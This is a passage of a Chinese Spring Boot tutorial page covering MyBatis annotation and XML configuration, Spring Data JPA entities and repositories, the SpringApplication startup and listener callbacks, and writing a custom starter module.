class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="images/搜狗截图20180305194443.png" alt=""></p><p>步骤：</p><p>​    1）、配置数据源相关属性（见上一节Druid）</p><p>​    2）、给数据库建表</p><p>​    3）、创建JavaBean</p><h3 id="4）、注解版"><a href="#4）、注解版" class="headerlink" title="4）、注解版"></a>4）、注解版</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//指定这是一个操作数据库的mapper</span></span><br><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">DepartmentMapper</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Select</span>(<span class="string">"select * from department where id=#&#123;id&#125;"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Department <span class="title">getDeptById</span><span class="params">(Integer id)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Delete</span>(<span class="string">"delete from department where id=#&#123;id&#125;"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">deleteDeptById</span><span class="params">(Integer id)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Options</span>(useGeneratedKeys = <span class="keyword">true</span>,keyProperty = <span class="string">"id"</span>)</span><br><span class="line">    <span class="meta">@Insert</span>(<span class="string">"insert into department(departmentName) values(#&#123;departmentName&#125;)"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">insertDept</span><span class="params">(Department department)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Update</span>(<span class="string">"update department set departmentName=#&#123;departmentName&#125; where id=#&#123;id&#125;"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">updateDept</span><span class="params">(Department department)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>问题：</p><p>自定义MyBatis的配置规则；给容器中添加一个ConfigurationCustomizer；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@org</span>.springframework.context.annotation.Configuration</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyBatisConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ConfigurationCustomizer <span class="title">configurationCustomizer</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ConfigurationCustomizer()&#123;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">customize</span><span class="params">(Configuration configuration)</span> </span>&#123;</span><br><span class="line">                configuration.setMapUnderscoreToCamelCase(<span class="keyword">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">使用MapperScan批量扫描所有的Mapper接口；</span><br><span class="line"><span class="meta">@MapperScan</span>(value = <span class="string">"com.atguigu.springboot.mapper"</span>)</span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SpringBoot06DataMybatisApplication</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">SpringApplication.run(SpringBoot06DataMybatisApplication.class, args);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5）、配置文件版"><a href="#5）、配置文件版" class="headerlink" title="5）、配置文件版"></a>5）、配置文件版</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">mybatis:</span></span><br><span class="line"><span class="attr">  config-location:</span> <span class="attr">classpath:mybatis/mybatis-config.xml</span> <span class="string">指定全局配置文件的位置</span></span><br><span class="line"><span class="attr">  mapper-locations:</span> <span class="attr">classpath:mybatis/mapper/*.xml</span>  <span class="string">指定sql映射文件的位置</span></span><br></pre></td></tr></table></figure><p>更多使用参照</p><p><a href="http://www.mybatis.org/spring-boot-starter/mybatis-spring-boot-autoconfigure/" target="_blank" rel="noopener">http://www.mybatis.org/spring-boot-starter/mybatis-spring-boot-autoconfigure/</a></p><h2 id="4、整合SpringData-JPA"><a href="#4、整合SpringData-JPA" class="headerlink" title="4、整合SpringData JPA"></a>4、整合SpringData JPA</h2><h3 id="1）、SpringData简介"><a href="#1）、SpringData简介" class="headerlink" title="1）、SpringData简介"></a>1）、SpringData简介</h3><p><img src="images/搜狗截图20180306105412.png" alt=""></p><h3 id="2）、整合SpringData-JPA"><a href="#2）、整合SpringData-JPA" class="headerlink" title="2）、整合SpringData JPA"></a>2）、整合SpringData JPA</h3><p>JPA:ORM（Object Relational Mapping）；</p><p>1）、编写一个实体类（bean）和数据表进行映射，并且配置好映射关系；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用JPA注解配置映射关系</span></span><br><span class="line"><span class="meta">@Entity</span> <span class="comment">//告诉JPA这是一个实体类（和数据表映射的类）</span></span><br><span class="line"><span class="meta">@Table</span>(name = <span class="string">"tbl_user"</span>) <span class="comment">//@Table来指定和哪个数据表对应;如果省略默认表名就是user；</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Id</span> <span class="comment">//这是一个主键</span></span><br><span class="line">    <span class="meta">@GeneratedValue</span>(strategy = GenerationType.IDENTITY)<span class="comment">//自增主键</span></span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Column</span>(name = <span class="string">"last_name"</span>,length = <span class="number">50</span>) <span class="comment">//这是和数据表对应的一个列</span></span><br><span class="line">    <span class="keyword">private</span> String lastName;</span><br><span class="line">    <span class="meta">@Column</span> <span class="comment">//省略默认列名就是属性名</span></span><br><span class="line">    <span class="keyword">private</span> String email;</span><br></pre></td></tr></table></figure><p>2）、编写一个Dao接口来操作实体类对应的数据表（Repository）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//继承JpaRepository来完成对数据库的操作</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserRepository</span> <span class="keyword">extends</span> <span class="title">JpaRepository</span>&lt;<span class="title">User</span>,<span class="title">Integer</span>&gt; </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3）、基本的配置JpaProperties</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span>  </span><br><span class="line"><span class="attr"> jpa:</span></span><br><span class="line"><span class="attr">    hibernate:</span></span><br><span class="line"><span class="comment">#     更新或者创建数据表结构</span></span><br><span class="line"><span class="attr">      ddl-auto:</span> <span class="string">update</span></span><br><span class="line"><span class="comment">#    控制台显示SQL</span></span><br><span class="line"><span class="attr">    show-sql:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><h1 id="七、启动配置原理"><a href="#七、启动配置原理" class="headerlink" title="七、启动配置原理"></a>七、启动配置原理</h1><p>几个重要的事件回调机制</p><p>配置在META-INF/spring.factories</p><p><strong>ApplicationContextInitializer</strong></p><p><strong>SpringApplicationRunListener</strong></p><p>只需要放在ioc容器中</p><p><strong>ApplicationRunner</strong></p><p><strong>CommandLineRunner</strong></p><p>启动流程：</p><h2 id="1、创建SpringApplication对象"><a href="#1、创建SpringApplication对象" class="headerlink" title="1、创建SpringApplication对象"></a><strong>1、创建SpringApplication对象</strong></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">initialize(sources);</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">initialize</span><span class="params">(Object[] sources)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//保存主配置类</span></span><br><span class="line">    <span class="keyword">if</span> (sources != <span class="keyword">null</span> &amp;&amp; sources.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.sources.addAll(Arrays.asList(sources));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//判断当前是否一个web应用</span></span><br><span class="line">    <span class="keyword">this</span>.webEnvironment = deduceWebEnvironment();</span><br><span class="line">    <span class="comment">//从类路径下找到META-INF/spring.factories配置的所有ApplicationContextInitializer；然后保存起来</span></span><br><span class="line">    setInitializers((Collection) getSpringFactoriesInstances(</span><br><span class="line">        ApplicationContextInitializer.class));</span><br><span class="line">    <span class="comment">//从类路径下找到ETA-INF/spring.factories配置的所有ApplicationListener</span></span><br><span class="line">    setListeners((Collection) getSpringFactoriesInstances(ApplicationListener.class));</span><br><span class="line">    <span class="comment">//从多个配置类中找到有main方法的主配置类</span></span><br><span class="line">    <span class="keyword">this</span>.mainApplicationClass = deduceMainApplicationClass();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="images/搜狗截图20180306145727.png" alt=""></p><p><img src="images/搜狗截图20180306145855.png" alt=""></p><h2 id="2、运行run方法"><a href="#2、运行run方法" class="headerlink" title="2、运行run方法"></a>2、运行run方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ConfigurableApplicationContext <span class="title">run</span><span class="params">(String... args)</span> </span>&#123;</span><br><span class="line">   StopWatch stopWatch = <span class="keyword">new</span> StopWatch();</span><br><span class="line">   stopWatch.start();</span><br><span class="line">   ConfigurableApplicationContext context = <span class="keyword">null</span>;</span><br><span class="line">   FailureAnalyzers analyzers = <span class="keyword">null</span>;</span><br><span class="line">   configureHeadlessProperty();</span><br><span class="line">    </span><br><span class="line">   <span class="comment">//获取SpringApplicationRunListeners；从类路径下META-INF/spring.factories</span></span><br><span class="line">   SpringApplicationRunListeners listeners = getRunListeners(args);</span><br><span class="line">    <span class="comment">//回调所有的获取SpringApplicationRunListener.starting()方法</span></span><br><span class="line">   listeners.starting();</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">       <span class="comment">//封装命令行参数</span></span><br><span class="line">      ApplicationArguments applicationArguments = <span class="keyword">new</span> DefaultApplicationArguments(</span><br><span class="line">            args);</span><br><span class="line">      <span class="comment">//准备环境</span></span><br><span class="line">      ConfigurableEnvironment environment = prepareEnvironment(listeners,</span><br><span class="line">            applicationArguments);</span><br><span class="line">       <span class="comment">//创建环境完成后回调SpringApplicationRunListener.environmentPrepared()；表示环境准备完成</span></span><br><span class="line">       </span><br><span class="line">      Banner printedBanner = printBanner(environment);</span><br><span class="line">       </span><br><span class="line">       <span class="comment">//创建ApplicationContext；决定创建web的ioc还是普通的ioc</span></span><br><span class="line">      context = createApplicationContext();</span><br><span class="line">       </span><br><span class="line">      analyzers = <span class="keyword">new</span> FailureAnalyzers(context);</span><br><span class="line">       <span class="comment">//准备上下文环境;将environment保存到ioc中；而且applyInitializers()；</span></span><br><span class="line">       <span class="comment">//applyInitializers()：回调之前保存的所有的ApplicationContextInitializer的initialize方法</span></span><br><span class="line">       <span class="comment">//回调所有的SpringApplicationRunListener的contextPrepared()；</span></span><br><span class="line">       <span class="comment">//</span></span><br><span class="line">      prepareContext(context, environment, listeners, applicationArguments,</span><br><span class="line">            printedBanner);</span><br><span class="line">       <span class="comment">//prepareContext运行完成以后回调所有的SpringApplicationRunListener的contextLoaded（）；</span></span><br><span class="line">       </span><br><span class="line">       <span class="comment">//s刷新容器；ioc容器初始化（如果是web应用还会创建嵌入式的Tomcat）；Spring注解版</span></span><br><span class="line">       <span class="comment">//扫描，创建，加载所有组件的地方；（配置类，组件，自动配置）</span></span><br><span class="line">      refreshContext(context);</span><br><span class="line">       <span class="comment">//从ioc容器中获取所有的ApplicationRunner和CommandLineRunner进行回调</span></span><br><span class="line">       <span class="comment">//ApplicationRunner先回调，CommandLineRunner再回调</span></span><br><span class="line">      afterRefresh(context, applicationArguments);</span><br><span class="line">       <span class="comment">//所有的SpringApplicationRunListener回调finished方法</span></span><br><span class="line">      listeners.finished(context, <span class="keyword">null</span>);</span><br><span class="line">      stopWatch.stop();</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.logStartupInfo) &#123;</span><br><span class="line">         <span class="keyword">new</span> StartupInfoLogger(<span class="keyword">this</span>.mainApplicationClass)</span><br><span class="line">               .logStarted(getApplicationLog(), stopWatch);</span><br><span class="line">      &#125;</span><br><span class="line">       <span class="comment">//整个SpringBoot应用启动完成以后返回启动的ioc容器；</span></span><br><span class="line">      <span class="keyword">return</span> context;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">      handleRunFailure(context, listeners, analyzers, ex);</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(ex);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3、事件监听机制"><a href="#3、事件监听机制" class="headerlink" title="3、事件监听机制"></a>3、事件监听机制</h2><p>配置在META-INF/spring.factories</p><p><strong>ApplicationContextInitializer</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloApplicationContextInitializer</span> <span class="keyword">implements</span> <span class="title">ApplicationContextInitializer</span>&lt;<span class="title">ConfigurableApplicationContext</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">initialize</span><span class="params">(ConfigurableApplicationContext applicationContext)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"ApplicationContextInitializer...initialize..."</span>+applicationContext);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>SpringApplicationRunListener</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloSpringApplicationRunListener</span> <span class="keyword">implements</span> <span class="title">SpringApplicationRunListener</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//必须有的构造器</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HelloSpringApplicationRunListener</span><span class="params">(SpringApplication application, String[] args)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">starting</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"SpringApplicationRunListener...starting..."</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">environmentPrepared</span><span class="params">(ConfigurableEnvironment environment)</span> </span>&#123;</span><br><span class="line">        Object o = environment.getSystemProperties().get(<span class="string">"os.name"</span>);</span><br><span class="line">        System.out.println(<span class="string">"SpringApplicationRunListener...environmentPrepared.."</span>+o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">contextPrepared</span><span class="params">(ConfigurableApplicationContext context)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"SpringApplicationRunListener...contextPrepared..."</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">contextLoaded</span><span class="params">(ConfigurableApplicationContext context)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"SpringApplicationRunListener...contextLoaded..."</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">finished</span><span class="params">(ConfigurableApplicationContext context, Throwable exception)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"SpringApplicationRunListener...finished..."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置（META-INF/spring.factories）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">org.springframework.context.ApplicationContextInitializer=\</span><br><span class="line">com.atguigu.springboot.listener.HelloApplicationContextInitializer</span><br><span class="line"></span><br><span class="line">org.springframework.boot.SpringApplicationRunListener=\</span><br><span class="line">com.atguigu.springboot.listener.HelloSpringApplicationRunListener</span><br></pre></td></tr></table></figure><p>只需要放在ioc容器中</p><p><strong>ApplicationRunner</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloApplicationRunner</span> <span class="keyword">implements</span> <span class="title">ApplicationRunner</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">(ApplicationArguments args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"ApplicationRunner...run...."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>CommandLineRunner</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloCommandLineRunner</span> <span class="keyword">implements</span> <span class="title">CommandLineRunner</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">(String... args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"CommandLineRunner...run..."</span>+ Arrays.asList(args));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="八、自定义starter"><a href="#八、自定义starter" class="headerlink" title="八、自定义starter"></a>八、自定义starter</h1><p>starter：</p><p>​    1、这个场景需要使用到的依赖是什么？</p><p>​    2、如何编写自动配置</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span>  <span class="comment">//指定这个类是一个配置类</span></span><br><span class="line"><span class="meta">@ConditionalOnXXX</span>  <span class="comment">//在指定条件成立的情况下自动配置类生效</span></span><br><span class="line"><span class="meta">@AutoConfigureAfter</span>  <span class="comment">//指定自动配置类的顺序</span></span><br><span class="line"><span class="meta">@Bean</span>  <span class="comment">//给容器中添加组件</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@ConfigurationPropertie</span>结合相关xxxProperties类来绑定相关的配置</span><br><span class="line"><span class="meta">@EnableConfigurationProperties</span> <span class="comment">//让xxxProperties生效加入到容器中</span></span><br><span class="line"></span><br><span class="line">自动配置类要能加载</span><br><span class="line">将需要启动就加载的自动配置类，配置在META-INF/spring.factories</span><br><span class="line">org.springframework.boot.autoconfigure.EnableAutoConfiguration=\</span><br><span class="line">org.springframework.boot.autoconfigure.admin.SpringApplicationAdminJmxAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.aop.AopAutoConfiguration,\</span><br></pre></td></tr></table></figure><p>​    3、模式：</p><p>启动器只用来做依赖导入；</p><p>专门来写一个自动配置模块；</p><p>启动器依赖自动配置；别人只需要引入启动器（starter）</p><p>mybatis-spring-boot-starter；自定义启动器名-spring-boot-starter</p><p>步骤：</p><p>1）、启动器模块</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.atguigu.starter<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>atguigu-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--启动器--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--引入自动配置模块--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.atguigu.starter<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>atguigu-spring-boot-starter-autoconfigurer<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2）、自动配置模块</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 